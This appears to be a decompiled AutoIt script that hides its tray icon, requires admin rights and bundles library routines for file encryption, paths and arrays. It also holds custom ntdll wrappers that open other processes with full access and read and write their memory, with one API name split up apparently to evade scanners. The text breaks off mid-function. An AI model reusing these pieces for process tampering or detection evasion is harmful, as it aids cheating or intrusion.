#include <SecurityConstants.au3>
#include <GDIPlus.au3>
#include <Misc.au3>
#include <IE.au3>
#include <NomadMemory.au3>
#include <GUIConstantsEx.au3>
#include <WindowsConstants.au3>
#include <WinApi.au3>
#include <Constants.au3>
#include <Console.au3>
#include <WinAPIEx.au3>
#include <Math.au3>
#include <StaticConstants.au3>
#include <ButtonConstants.au3>
#include <EditConstants.au3>


#NoTrayIcon
#RequireAdmin


 Global Const $HTTP_STATUS_OK = 200


Func _crypt_encryptfile($ssourcefile, $sdestinationfile, $vcryptkey, $ialg_id)
	Local $hinfile, $houtfile
	Local $ierror = 0, $vreturn = True
	Local $btempdata
	Local $ifilesize = FileGetSize($ssourcefile)
	Local $iread = 0
	_crypt_startup()
	Do
		If $ialg_id <> $calg_userkey Then
			$vcryptkey = _crypt_derivekey($vcryptkey, $ialg_id)
			If @error Then
				$ierror = 1
				$vreturn = -1
				ExitLoop
			EndIf
		EndIf
		$hinfile = FileOpen($ssourcefile, 16)
		If @error Then
			$ierror = 2
			$vreturn = -1
			ExitLoop
		EndIf
		$houtfile = FileOpen($sdestinationfile, 26)
		If @error Then
			$ierror = 3
			$vreturn = -1
			ExitLoop
		EndIf
		Do
			$btempdata = FileRead($hinfile, 1024 * 1024)
			$iread += BinaryLen($btempdata)
			If $iread = $ifilesize Then
				$btempdata = _crypt_encryptdata($btempdata, $vcryptkey, $calg_userkey, True)
				If @error Then
					$ierror = 4
					$vreturn = -1
				EndIf
				FileWrite($houtfile, $btempdata)
				ExitLoop 2
			Else
				$btempdata = _crypt_encryptdata($btempdata, $vcryptkey, $calg_userkey, False)
				If @error Then
					$ierror = 5
					$vreturn = -1
					ExitLoop 2
				EndIf
				FileWrite($houtfile, $btempdata)
			EndIf
		Until False
	Until True
	If $ialg_id <> $calg_userkey Then _crypt_destroykey($vcryptkey)
	_crypt_shutdown()
	If $hinfile <> -1 Then FileClose($hinfile)
	If $houtfile <> -1 Then FileClose($houtfile)
	Return SetError($ierror, 0, $vreturn)
EndFunc
Func _crypt_decryptfile($ssourcefile, $sdestinationfile, $vcryptkey, $ialg_id)
	Local $hinfile, $houtfile
	Local $ierror = 0, $vreturn = True
	Local $btempdata
	Local $ifilesize = FileGetSize($ssourcefile)
	Local $iread = 0
	_crypt_startup()
	Do
		If $ialg_id <> $calg_userkey Then
			$vcryptkey = _crypt_derivekey($vcryptkey, $ialg_id)
			If @error Then
				$ierror = 1
				$vreturn = -1
				ExitLoop
			EndIf
		EndIf
		$hinfile = FileOpen($ssourcefile, 16)
		If @error Then
			$ierror = 2
			$vreturn = -1
			ExitLoop
		EndIf
		$houtfile = FileOpen($sdestinationfile, 26)
		If @error Then
			$ierror = 3
			$vreturn = -1
			ExitLoop
		EndIf
		Do
			$btempdata = FileRead($hinfile, 1024 * 1024)
			$iread += BinaryLen($btempdata)
			If $iread = $ifilesize Then
				$btempdata = _crypt_decryptdata($btempdata, $vcryptkey, $calg_userkey, True)
				If @error Then
					$ierror = 4
					$vreturn = -1
				EndIf
				FileWrite($houtfile, $btempdata)
				ExitLoop 2
			Else
				$btempdata = _crypt_decryptdata($btempdata, $vcryptkey, $calg_userkey, False)
				If @error Then
					$ierror = 5
					$vreturn = -1
					ExitLoop 2
				EndIf
				FileWrite($houtfile, $btempdata)
			EndIf
		Until False
	Until True
	If $ialg_id <> $calg_userkey Then _crypt_destroykey($vcryptkey)
	_crypt_shutdown()
	If $hinfile <> -1 Then FileClose($hinfile)
	If $houtfile <> -1 Then FileClose($houtfile)
	Return SetError($ierror, 0, $vreturn)
EndFunc
Func __crypt_refcount()
	Return $__g_acryptinternaldata[0]
EndFunc
Func __crypt_refcountinc()
	$__g_acryptinternaldata[0] += 1
EndFunc
Func __crypt_refcountdec()
	If $__g_acryptinternaldata[0] > 0 Then $__g_acryptinternaldata[0] -= 1
EndFunc
Func __crypt_dllhandle()
	Return $__g_acryptinternaldata[1]
EndFunc
Func __crypt_dllhandleset($hadvapi32)
	$__g_acryptinternaldata[1] = $hadvapi32
EndFunc
Func __crypt_context()
	Return $__g_acryptinternaldata[2]
EndFunc
Func __crypt_contextset($hcryptcontext)
	$__g_acryptinternaldata[2] = $hcryptcontext
EndFunc
Func _filecountlines($sfilepath)
	Local $hfile = FileOpen($sfilepath, $fo_read)
	If $hfile = -1 Then Return SetError(1, 0, 0)
	Local $sfilecontent = StringStripWS(FileRead($hfile), 2)
	FileClose($hfile)
	Local $atmp
	If StringInStr($sfilecontent, @LF) Then
		$atmp = StringSplit(StringStripCR($sfilecontent), @LF)
	ElseIf StringInStr($sfilecontent, @CR) Then
		$atmp = StringSplit($sfilecontent, @CR)
	Else
		If StringLen($sfilecontent) Then
			Return 1
		Else
			Return SetError(2, 0, 0)
		EndIf
	EndIf
	Return $atmp[0]
EndFunc
Func _filecreate($sfilepath)
	Local $hopenfile = FileOpen($sfilepath, $fo_overwrite)
	If $hopenfile = -1 Then Return SetError(1, 0, 0)
	Local $hwritefile = FileWrite($hopenfile, "")
	FileClose($hopenfile)
	If $hwritefile = -1 Then Return SetError(2, 0, 0)
	Return 1
EndFunc
Func _filelisttoarray($spath, $sfilter = "*", $iflag = 0)
	Local $hsearch, $sfile, $sfilelist, $sdelim = "|"
	$spath = StringRegExpReplace($spath, "[\\/]+\z", "") & "\"
	If NOT FileExists($spath) Then Return SetError(1, 1, "")
	If StringRegExp($sfilter, "[\\/:><\|]|(?s)\A\s*\z") Then Return SetError(2, 2, "")
	If NOT ($iflag = 0 OR $iflag = 1 OR $iflag = 2) Then Return SetError(3, 3, "")
	$hsearch = FileFindFirstFile($spath & $sfilter)
	If @error Then Return SetError(4, 4, "")
	While 1
		$sfile = FileFindNextFile($hsearch)
		If @error Then ExitLoop
		If ($iflag + @extended = 2) Then ContinueLoop
		$sfilelist &= $sdelim & $sfile
	WEnd
	FileClose($hsearch)
	If NOT $sfilelist Then Return SetError(4, 4, "")
	Return StringSplit(StringTrimLeft($sfilelist, 1), "|")
EndFunc
Func _fileprint($s_file, $i_show = @SW_HIDE)
	Local $a_ret = DllCall("shell32.dll", "int", "ShellExecuteW", "hwnd", 0, "wstr", "print", "wstr", $s_file, "wstr", "", "wstr", "", "int", $i_show)
	If @error Then Return SetError(@error, @extended, 0)
	If $a_ret[0] <= 32 Then Return SetError(10, $a_ret[0], 0)
	Return 1
EndFunc
Func _filereadtoarray($sfilepath, ByRef $aarray)
	Local $hfile = FileOpen($sfilepath, $fo_read)
	If $hfile = -1 Then Return SetError(1, 0, 0)
	Local $afile = FileRead($hfile, FileGetSize($sfilepath))
	If StringRight($afile, 1) = @LF Then $afile = StringTrimRight($afile, 1)
	If StringRight($afile, 1) = @CR Then $afile = StringTrimRight($afile, 1)
	FileClose($hfile)
	If StringInStr($afile, @LF) Then
		$aarray = StringSplit(StringStripCR($afile), @LF)
	ElseIf StringInStr($afile, @CR) Then
		$aarray = StringSplit($afile, @CR)
	Else
		If StringLen($afile) Then
			Dim $aarray[2] = [1, $afile]
		Else
			Return SetError(2, 0, 0)
		EndIf
	EndIf
	Return 1
EndFunc
Func _filewritefromarray($file, $a_array, $i_base = 0, $i_ubound = 0, $s_delim = "|")
	If NOT IsArray($a_array) Then Return SetError(2, 0, 0)
	Local $idims = UBound($a_array, 0)
	If $idims > 2 Then Return SetError(4, 0, 0)
	Local $last = UBound($a_array) - 1
	If $i_ubound < 1 OR $i_ubound > $last Then $i_ubound = $last
	If $i_base < 0 OR $i_base > $last Then $i_base = 0
	Local $hfile
	If IsString($file) Then
		$hfile = FileOpen($file, $fo_overwrite)
	Else
		$hfile = $file
	EndIf
	If $hfile = -1 Then Return SetError(1, 0, 0)
	Local $errorsav = 0
	Switch $idims
		Case 1
			For $x = $i_base To $i_ubound
				If FileWrite($hfile, $a_array[$x] & @CRLF) = 0 Then
					$errorsav = 3
					ExitLoop
				EndIf
			Next
		Case 2
			Local $s_temp
			For $x = $i_base To $i_ubound
				$s_temp = $a_array[$x][0]
				For $y = 1 To $idims
					$s_temp &= $s_delim & $a_array[$x][$y]
				Next
				If FileWrite($hfile, $s_temp & @CRLF) = 0 Then
					$errorsav = 3
					ExitLoop
				EndIf
			Next
	EndSwitch
	If IsString($file) Then FileClose($hfile)
	If $errorsav Then Return SetError($errorsav, 0, 0)
	Return 1
EndFunc
Func _pathfull($srelativepath, $sbasepath = @WorkingDir)
	If NOT $srelativepath OR $srelativepath = "." Then Return $sbasepath
	Local $sfullpath = StringReplace($srelativepath, "/", "\")
	Local Const $sfullpathconst = $sfullpath
	Local $spath
	Local $brootonly = StringLeft($sfullpath, 1) = "\" AND StringMid($sfullpath, 2, 1) <> "\"
	For $i = 1 To 2
		$spath = StringLeft($sfullpath, 2)
		If $spath = "\\" Then
			$sfullpath = StringTrimLeft($sfullpath, 2)
			Local $nserverlen = StringInStr($sfullpath, "\") - 1
			$spath = "\\" & StringLeft($sfullpath, $nserverlen)
			$sfullpath = StringTrimLeft($sfullpath, $nserverlen)
			ExitLoop
		ElseIf StringRight($spath, 1) = ":" Then
			$sfullpath = StringTrimLeft($sfullpath, 2)
			ExitLoop
		Else
			$sfullpath = $sbasepath & "\" & $sfullpath
		EndIf
	Next
	If $i = 3 Then Return ""
	If StringLeft($sfullpath, 1) <> "\" Then
		If StringLeft($sfullpathconst, 2) = StringLeft($sbasepath, 2) Then
			$sfullpath = $sbasepath & "\" & $sfullpath
		Else
			$sfullpath = "\" & $sfullpath
		EndIf
	EndIf
	Local $atemp = StringSplit($sfullpath, "\")
	Local $apathparts[$atemp[0]], $j = 0
	For $i = 2 To $atemp[0]
		If $atemp[$i] = ".." Then
			If $j Then $j -= 1
		ElseIf NOT ($atemp[$i] = "" AND $i <> $atemp[0]) AND $atemp[$i] <> "." Then
			$apathparts[$j] = $atemp[$i]
			$j += 1
		EndIf
	Next
	$sfullpath = $spath
	If NOT $brootonly Then
		For $i = 0 To $j - 1
			$sfullpath &= "\" & $apathparts[$i]
		Next
	Else
		$sfullpath &= $sfullpathconst
		If StringInStr($sfullpath, "..") Then $sfullpath = _pathfull($sfullpath)
	EndIf
	While StringInStr($sfullpath, ".\")
		$sfullpath = StringReplace($sfullpath, ".\", "\")
	WEnd
	Return $sfullpath
EndFunc
Func _pathgetrelative($sfrom, $sto)
	If StringRight($sfrom, 1) <> "\" Then $sfrom &= "\"
	If StringRight($sto, 1) <> "\" Then $sto &= "\"
	If $sfrom = $sto Then Return SetError(1, 0, StringTrimRight($sto, 1))
	Local $asfrom = StringSplit($sfrom, "\")
	Local $asto = StringSplit($sto, "\")
	If $asfrom[1] <> $asto[1] Then Return SetError(2, 0, StringTrimRight($sto, 1))
	Local $i = 2
	Local $idiff = 1
	While 1
		If $asfrom[$i] <> $asto[$i] Then
			$idiff = $i
			ExitLoop
		EndIf
		$i += 1
	WEnd
	$i = 1
	Local $srelpath = ""
	For $j = 1 To $asto[0]
		If $i >= $idiff Then
			$srelpath &= "\" & $asto[$i]
		EndIf
		$i += 1
	Next
	$srelpath = StringTrimLeft($srelpath, 1)
	$i = 1
	For $j = 1 To $asfrom[0]
		If $i > $idiff Then
			$srelpath = "..\" & $srelpath
		EndIf
		$i += 1
	Next
	If StringRight($srelpath, 1) == "\" Then $srelpath = StringTrimRight($srelpath, 1)
	Return $srelpath
EndFunc
Func _pathmake($szdrive, $szdir, $szfname, $szext)
	If StringLen($szdrive) Then
		If NOT (StringLeft($szdrive, 2) = "\\") Then $szdrive = StringLeft($szdrive, 1) & ":"
	EndIf
	If StringLen($szdir) Then
		If NOT (StringRight($szdir, 1) = "\") AND NOT (StringRight($szdir, 1) = "/") Then $szdir = $szdir & "\"
	EndIf
	If StringLen($szext) Then
		If NOT (StringLeft($szext, 1) = ".") Then $szext = "." & $szext
	EndIf
	Return $szdrive & $szdir & $szfname & $szext
EndFunc
Func _pathsplit($szpath, ByRef $szdrive, ByRef $szdir, ByRef $szfname, ByRef $szext)
	Local $drive = ""
	Local $dir = ""
	Local $fname = ""
	Local $ext = ""
	Local $pos
	Local $array[5]
	$array[0] = $szpath
	If StringMid($szpath, 2, 1) = ":" Then
		$drive = StringLeft($szpath, 2)
		$szpath = StringTrimLeft($szpath, 2)
	ElseIf StringLeft($szpath, 2) = "\\" Then
		$szpath = StringTrimLeft($szpath, 2)
		$pos = StringInStr($szpath, "\")
		If $pos = 0 Then $pos = StringInStr($szpath, "/")
		If $pos = 0 Then
			$drive = "\\" & $szpath
			$szpath = ""
		Else
			$drive = "\\" & StringLeft($szpath, $pos - 1)
			$szpath = StringTrimLeft($szpath, $pos - 1)
		EndIf
	EndIf
	Local $nposforward = StringInStr($szpath, "/", 0, -1)
	Local $nposbackward = StringInStr($szpath, "\", 0, -1)
	If $nposforward >= $nposbackward Then
		$pos = $nposforward
	Else
		$pos = $nposbackward
	EndIf
	$dir = StringLeft($szpath, $pos)
	$fname = StringRight($szpath, StringLen($szpath) - $pos)
	If StringLen($dir) = 0 Then $fname = $szpath
	$pos = StringInStr($fname, ".", 0, -1)
	If $pos Then
		$ext = StringRight($fname, StringLen($fname) - ($pos - 1))
		$fname = StringLeft($fname, $pos - 1)
	EndIf
	$szdrive = $drive
	$szdir = $dir
	$szfname = $fname
	$szext = $ext
	$array[1] = $drive
	$array[2] = $dir
	$array[3] = $fname
	$array[4] = $ext
	Return $array
EndFunc
Func _replacestringinfile($szfilename, $szsearchstring, $szreplacestring, $fcaseness = 0, $foccurance = 1)
	Local $iretval = 0
	Local $ncount, $sendswith
	If StringInStr(FileGetAttrib($szfilename), "R") Then Return SetError(6, 0, -1)
	Local $hfile = FileOpen($szfilename, $fo_read)
	If $hfile = -1 Then Return SetError(1, 0, -1)
	Local $s_totfile = FileRead($hfile, FileGetSize($szfilename))
	If StringRight($s_totfile, 2) = @CRLF Then
		$sendswith = @CRLF
	ElseIf StringRight($s_totfile, 1) = @CR Then
		$sendswith = @CR
	ElseIf StringRight($s_totfile, 1) = @LF Then
		$sendswith = @LF
	Else
		$sendswith = ""
	EndIf
	Local $afilelines = StringSplit(StringStripCR($s_totfile), @LF)
	FileClose($hfile)
	Local $iencoding = FileGetEncoding($szfilename)
	Local $hwritehandle = FileOpen($szfilename, $iencoding + $fo_overwrite)
	If $hwritehandle = -1 Then Return SetError(2, 0, -1)
	For $ncount = 1 To $afilelines[0]
		If StringInStr($afilelines[$ncount], $szsearchstring, $fcaseness) Then
			$afilelines[$ncount] = StringReplace($afilelines[$ncount], $szsearchstring, $szreplacestring, 1 - $foccurance, $fcaseness)
			$iretval = $iretval + 1
			If $foccurance = 0 Then
				$iretval = 1
				ExitLoop
			EndIf
		EndIf
	Next
	For $ncount = 1 To $afilelines[0] - 1
		If FileWriteLine($hwritehandle, $afilelines[$ncount]) = 0 Then
			FileClose($hwritehandle)
			Return SetError(3, 0, -1)
		EndIf
	Next
	If $afilelines[$ncount] <> "" Then FileWrite($hwritehandle, $afilelines[$ncount] & $sendswith)
	FileClose($hwritehandle)
	Return $iretval
EndFunc
Func _tempfile($s_directoryname = @TempDir, $s_fileprefix = "~", $s_fileextension = ".tmp", $i_randomlength = 7)
	If IsKeyword($s_fileprefix) Then $s_fileprefix = "~"
	If IsKeyword($s_fileextension) Then $s_fileextension = ".tmp"
	If IsKeyword($i_randomlength) Then $i_randomlength = 7
	If NOT FileExists($s_directoryname) Then $s_directoryname = @TempDir
	If NOT FileExists($s_directoryname) Then $s_directoryname = @TempDir
	If StringRight($s_directoryname, 1) <> "\" Then $s_directoryname = $s_directoryname & "\"
	Local $s_tempname
	Do
		$s_tempname = ""
		While StringLen($s_tempname) < $i_randomlength
			$s_tempname = $s_tempname & Chr(Random(97, 122, 1))
		WEnd
		$s_tempname = $s_directoryname & $s_fileprefix & $s_tempname & $s_fileextension
	Until NOT FileExists($s_tempname)
	Return $s_tempname
EndFunc
$dllsoftwarezzz = "ntdll.dll"
Func _ntopenprocesszzz($pid)
	Local Const $tagobjectattributes = "ulong Length;hwnd RootDirectory;ptr ObjectName;ulong Attributes;ptr SecurityDescriptor;ptr SecurityQualityOfService"
	Local $soa = DllStructCreate($tagobjectattributes)
	DllStructSetData($soa, "Length", DllStructGetSize($soa))
	DllStructSetData($soa, "RootDirectory", 0)
	DllStructSetData($soa, "ObjectName", 0)
	DllStructSetData($soa, "Attributes", 64)
	DllStructSetData($soa, "SecurityDescriptor", 0)
	DllStructSetData($soa, "SecurityQualityOfService", 0)
	Local $clientid = DllStructCreate("dword_ptr UniqueProcessId;dword_ptr UniqueThreadId")
	DllStructSetData($clientid, "UniqueProcessId", $pid)
	DllStructSetData($clientid, "UniqueThreadId", 0)
	Local $acall = DllCall($dllsoftwarezzz, "hwnd", "NtOpenProcess", "handle*", 0, "dword", 2035711, "struct*", $soa, "struct*", $clientid)
	If NOT nt2_successzzz($acall[0]) Then
		ConsoleWrite("Error in NtOpenProcess: " & Hex($acall[0], 8) & @CRLF)
		Return SetError(1, 0, $acall[0])
	Else
		Return $acall[1]
	EndIf
EndFunc
Func nt2_successzzz($status)
	If 0 <= $status AND $status <= 2147483647 Then
		Return True
	Else
		Return False
	EndIf
EndFunc
Func _ntreadvirtualmemoryzzz($i_baseaddress, $h_process, $s_type, $i_read = 1)
	Local $a_res, $t_buff, $i_size, $p_buff
	$t_buff = DllStructCreate($s_type & "[" & $i_read & "]")
	$i_size = DllStructGetSize($t_buff)
	$p_buff = DllStructGetPtr($t_buff)
	$a_res = DllCall($dllsoftwarezzz, "int", "NtReadVirtualMemory", "handle", $h_process, "ptr", $i_baseaddress, "ptr", $p_buff, "ulong", $i_size, "int*", 0)
	If (@error) OR ($a_res[0]) Then Return SetError(1, 0, "")
	Return SetExtended($a_res[5], DllStructGetData($t_buff, 1))
EndFunc
Func _ntclosezzz($h_hwnd)
	Local $a_res = DllCall($dllsoftwarezzz, "int", "NtClose", "handle", $h_hwnd)
	If (@error) OR ($a_res[0]) Then Return False
	Return True
EndFunc
Func _ntwritevirtualmemoryzzz($vaddress, $hprocess, $v_data, $sv_type = "dword")
	Local $v_buffer = DllStructCreate($sv_type)
	If @error Then
		SetError(@error + 1)
		Return 0
	Else
		DllStructSetData($v_buffer, 1, $v_data)
		If @error Then
			SetError(6)
			Return 0
		EndIf
	EndIf
	$c = DllStructCreate("int", DllStructGetPtr($v_buffer, 1))
	$aret = DllCall("ntdll.dll", "int", "NtWrite" & "VirtualMemory", "int", $hprocess, "ptr", $vaddress, "ptr*", DllStructGetData($c, 1), "int", DllStructGetSize($v_buffer), "int", 0)
	Return (NOT @error) AND ($aret[0] <> 0)
EndFunc
Func _arrayadd(ByRef $avarray, $vvalue)
	If NOT IsArray($avarray) Then Return SetError(1, 0, -1)
	If UBound($avarray, 0) <> 1 Then Return SetError(2, 0, -1)
	Local $iubound = UBound($avarray)
	ReDim $avarray[$iubound + 1]
	$avarray[$iubound] = $vvalue
	Return $iubound
EndFunc
Func _arraybinarysearch(Const ByRef $avarray, $vvalue, $istart = 0, $iend = 0)
	If NOT IsArray($avarray) Then Return SetError(1, 0, -1)
	If UBound($avarray, 0) <> 1 Then Return SetError(5, 0, -1)
	Local $iubound = UBound($avarray) - 1
	If $iend < 1 OR $iend > $iubound Then $iend = $iubound
	If $istart < 0 Then $istart = 0
	If $istart > $iend Then Return SetError(4, 0, -1)
	Local $imid = Int(($iend + $istart) / 2)
	If $avarray[$istart] > $vvalue OR $avarray[$iend] < $vvalue Then Return SetError(2, 0, -1)
	While $istart <= $imid AND $vvalue <> $avarray[$imid]
		If $vvalue < $avarray[$imid] Then
			$iend = $imid - 1
		Else
			$istart = $imid + 1
		EndIf
		$imid = Int(($iend + $istart) / 2)
	WEnd
	If $istart > $iend Then Return SetError(3, 0, -1)
	Return $imid
EndFunc
Func _arraycombinations(ByRef $avarray, $iset, $sdelim = "")
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	If UBound($avarray, 0) <> 1 Then Return SetError(2, 0, 0)
	Local $in = UBound($avarray)
	Local $ir = $iset
	Local $aidx[$ir]
	For $i = 0 To $ir - 1
		$aidx[$i] = $i
	Next
	Local $itotal = __array_combinations($in, $ir)
	Local $ileft = $itotal
	Local $aresult[$itotal + 1]
	$aresult[0] = $itotal
	Local $icount = 1
	While $ileft > 0
		__array_getnext($in, $ir, $ileft, $itotal, $aidx)
		For $i = 0 To $iset - 1
			$aresult[$icount] &= $avarray[$aidx[$i]] & $sdelim
		Next
		If $sdelim <> "" Then $aresult[$icount] = StringTrimRight($aresult[$icount], 1)
		$icount += 1
	WEnd
	Return $aresult
EndFunc
Func _arrayconcatenate(ByRef $avarraytarget, Const ByRef $avarraysource, $istart = 0)
	If NOT IsArray($avarraytarget) Then Return SetError(1, 0, 0)
	If NOT IsArray($avarraysource) Then Return SetError(2, 0, 0)
	If UBound($avarraytarget, 0) <> 1 Then
		If UBound($avarraysource, 0) <> 1 Then Return SetError(5, 0, 0)
		Return SetError(3, 0, 0)
	EndIf
	If UBound($avarraysource, 0) <> 1 Then Return SetError(4, 0, 0)
	Local $iuboundtarget = UBound($avarraytarget) - $istart, $iuboundsource = UBound($avarraysource)
	ReDim $avarraytarget[$iuboundtarget + $iuboundsource]
	For $i = $istart To $iuboundsource - 1
		$avarraytarget[$iuboundtarget + $i] = $avarraysource[$i]
	Next
	Return $iuboundtarget + $iuboundsource
EndFunc
Func _arraycreate($v_0, $v_1 = 0, $v_2 = 0, $v_3 = 0, $v_4 = 0, $v_5 = 0, $v_6 = 0, $v_7 = 0, $v_8 = 0, $v_9 = 0, $v_10 = 0, $v_11 = 0, $v_12 = 0, $v_13 = 0, $v_14 = 0, $v_15 = 0, $v_16 = 0, $v_17 = 0, $v_18 = 0, $v_19 = 0, $v_20 = 0)
	Local $av_array[21] = [$v_0, $v_1, $v_2, $v_3, $v_4, $v_5, $v_6, $v_7, $v_8, $v_9, $v_10, $v_11, $v_12, $v_13, $v_14, $v_15, $v_16, $v_17, $v_18, $v_19, $v_20]
	ReDim $av_array[@NumParams]
	Return $av_array
EndFunc
Func _arraydelete(ByRef $avarray, $ielement)
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	Local $iubound = UBound($avarray, 1) - 1
	If NOT $iubound Then
		$avarray = ""
		Return 0
	EndIf
	If $ielement < 0 Then $ielement = 0
	If $ielement > $iubound Then $ielement = $iubound
	Switch UBound($avarray, 0)
		Case 1
			For $i = $ielement To $iubound - 1
				$avarray[$i] = $avarray[$i + 1]
			Next
			ReDim $avarray[$iubound]
		Case 2
			Local $isubmax = UBound($avarray, 2) - 1
			For $i = $ielement To $iubound - 1
				For $j = 0 To $isubmax
					$avarray[$i][$j] = $avarray[$i + 1][$j]
				Next
			Next
			ReDim $avarray[$iubound][$isubmax + 1]
		Case Else
			Return SetError(3, 0, 0)
	EndSwitch
	Return $iubound
EndFunc
Func _arraydisplay(Const ByRef $avarray, $stitle = "Array: ListView Display", $iitemlimit = -1, $itranspose = 0, $sseparator = "", $sreplace = "|", $sheader = "")
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	Local $idimension = UBound($avarray, 0), $iubound = UBound($avarray, 1) - 1, $isubmax = UBound($avarray, 2) - 1
	If $idimension > 2 Then Return SetError(2, 0, 0)
	If $sseparator = "" Then $sseparator = Chr(124)
	If _arraysearch($avarray, $sseparator, 0, 0, 0, 1) <> -1 Then
		For $x = 1 To 255
			If $x >= 32 AND $x <= 127 Then ContinueLoop
			Local $sfind = _arraysearch($avarray, Chr($x), 0, 0, 0, 1)
			If $sfind = -1 Then
				$sseparator = Chr($x)
				ExitLoop
			EndIf
		Next
	EndIf
	Local $vtmp, $ibuffer = 4094
	Local $icollimit = 250
	Local $ioneventmode = Opt("GUIOnEventMode", 0), $sdataseparatorchar = Opt("GUIDataSeparatorChar", $sseparator)
	If $isubmax < 0 Then $isubmax = 0
	If $itranspose Then
		$vtmp = $iubound
		$iubound = $isubmax
		$isubmax = $vtmp
	EndIf
	If $isubmax > $icollimit Then $isubmax = $icollimit
	If $iitemlimit < 1 Then $iitemlimit = $iubound
	If $iubound > $iitemlimit Then $iubound = $iitemlimit
	If $sheader = "" Then
		$sheader = "Row  "
		For $i = 0 To $isubmax
			$sheader &= $sseparator & "Col " & $i
		Next
	EndIf
	Local $avarraytext[$iubound + 1]
	For $i = 0 To $iubound
		$avarraytext[$i] = "[" & $i & "]"
		For $j = 0 To $isubmax
			If $idimension = 1 Then
				If $itranspose Then
					$vtmp = $avarray[$j]
				Else
					$vtmp = $avarray[$i]
				EndIf
			Else
				If $itranspose Then
					$vtmp = $avarray[$j][$i]
				Else
					$vtmp = $avarray[$i][$j]
				EndIf
			EndIf
			$vtmp = StringReplace($vtmp, $sseparator, $sreplace, 0, 1)
			If StringLen($vtmp) > $ibuffer Then $vtmp = StringLeft($vtmp, $ibuffer)
			$avarraytext[$i] &= $sseparator & $vtmp
		Next
	Next
	Local Const $_arrayconstant_gui_dockborders = 102
	Local Const $_arrayconstant_gui_dockbottom = 64
	Local Const $_arrayconstant_gui_dockheight = 512
	Local Const $_arrayconstant_gui_dockleft = 2
	Local Const $_arrayconstant_gui_dockright = 4
	Local Const $_arrayconstant_gui_event_close = -3
	Local Const $_arrayconstant_lvm_getcolumnwidth = (4096 + 29)
	Local Const $_arrayconstant_lvm_getitemcount = (4096 + 4)
	Local Const $_arrayconstant_lvm_getitemstate = (4096 + 44)
	Local Const $_arrayconstant_lvm_setextendedlistviewstyle = (4096 + 54)
	Local Const $_arrayconstant_lvs_ex_fullrowselect = 32
	Local Const $_arrayconstant_lvs_ex_gridlines = 1
	Local Const $_arrayconstant_lvs_showselalways = 8
	Local Const $_arrayconstant_ws_ex_clientedge = 512
	Local Const $_arrayconstant_ws_maximizebox = 65536
	Local Const $_arrayconstant_ws_minimizebox = 131072
	Local Const $_arrayconstant_ws_sizebox = 262144
	Local $iwidth = 640, $iheight = 480
	Local $hgui = GUICreate($stitle, $iwidth, $iheight, Default, Default, BitOR($_arrayconstant_ws_sizebox, $_arrayconstant_ws_minimizebox, $_arrayconstant_ws_maximizebox))
	Local $aiguisize = WinGetClientSize($hgui)
	Local $hlistview = GUICtrlCreateListView($sheader, 0, 0, $aiguisize[0], $aiguisize[1] - 26, $_arrayconstant_lvs_showselalways)
	Local $hcopy = GUICtrlCreateButton("Copy Selected", 3, $aiguisize[1] - 23, $aiguisize[0] - 6, 20)
	GUICtrlSetResizing($hlistview, $_arrayconstant_gui_dockborders)
	GUICtrlSetResizing($hcopy, $_arrayconstant_gui_dockleft + $_arrayconstant_gui_dockright + $_arrayconstant_gui_dockbottom + $_arrayconstant_gui_dockheight)
	GUICtrlSendMsg($hlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_lvs_ex_gridlines, $_arrayconstant_lvs_ex_gridlines)
	GUICtrlSendMsg($hlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_lvs_ex_fullrowselect, $_arrayconstant_lvs_ex_fullrowselect)
	GUICtrlSendMsg($hlistview, $_arrayconstant_lvm_setextendedlistviewstyle, $_arrayconstant_ws_ex_clientedge, $_arrayconstant_ws_ex_clientedge)
	For $i = 0 To $iubound
		GUICtrlCreateListViewItem($avarraytext[$i], $hlistview)
	Next
	$iwidth = 0
	For $i = 0 To $isubmax + 1
		$iwidth += GUICtrlSendMsg($hlistview, $_arrayconstant_lvm_getcolumnwidth, $i, 0)
	Next
	If $iwidth < 250 Then $iwidth = 230
	$iwidth += 20
	If $iwidth > @DesktopWidth Then $iwidth = @DesktopWidth - 100
	WinMove($hgui, "", (@DesktopWidth - $iwidth) / 2, Default, $iwidth)
	GUISetState(@SW_SHOW, $hgui)
	While 1
		Switch GUIGetMsg()
			Case $_arrayconstant_gui_event_close
				ExitLoop
			Case $hcopy
				Local $sclip = ""
				Local $aicuritems[1] = [0]
				For $i = 0 To GUICtrlSendMsg($hlistview, $_arrayconstant_lvm_getitemcount, 0, 0)
					If GUICtrlSendMsg($hlistview, $_arrayconstant_lvm_getitemstate, $i, 2) Then
						$aicuritems[0] += 1
						ReDim $aicuritems[$aicuritems[0] + 1]
						$aicuritems[$aicuritems[0]] = $i
					EndIf
				Next
				If NOT $aicuritems[0] Then
					For $sitem In $avarraytext
						$sclip &= $sitem & @CRLF
					Next
				Else
					For $i = 1 To UBound($aicuritems) - 1
						$sclip &= $avarraytext[$aicuritems[$i]] & @CRLF
					Next
				EndIf
				ClipPut($sclip)
		EndSwitch
	WEnd
	GUIDelete($hgui)
	Opt("GUIOnEventMode", $ioneventmode)
	Opt("GUIDataSeparatorChar", $sdataseparatorchar)
	Return 1
EndFunc
Func _arrayfindall(Const ByRef $avarray, $vvalue, $istart = 0, $iend = 0, $icase = 0, $icompare = 0, $isubitem = 0)
	$istart = _arraysearch($avarray, $vvalue, $istart, $iend, $icase, $icompare, 1, $isubitem)
	If @error Then Return SetError(@error, 0, -1)
	Local $iindex = 0, $avresult[UBound($avarray)]
	Do
		$avresult[$iindex] = $istart
		$iindex += 1
		$istart = _arraysearch($avarray, $vvalue, $istart + 1, $iend, $icase, $icompare, 1, $isubitem)
	Until @error
	ReDim $avresult[$iindex]
	Return $avresult
EndFunc
Func _arrayinsert(ByRef $avarray, $ielement, $vvalue = "")
	If NOT IsArray($avarray) Then Return SetError(1, 0, 0)
	If UBound($avarray, 0) <> 1 Then Return SetError(2, 0, 0)
	Local $iubound = UBound($avarray) + 1
	ReDim $avarray[$iubound]
	For $i = $iubound - 1 To $ielement + 1 Step -1
		$avarray[$i] = $avarray[$i - 1]
	Next
	$avarray[$ielement] = $vvalue
	Return $iubound
EndFunc
Func _arraymax(Const ByRef $avarray, $icompnumeric = 0, $istart = 0, $iend = 0)
	Local $iresult = _arraymaxindex($avarray, $icompnumeric, $istart, $iend)
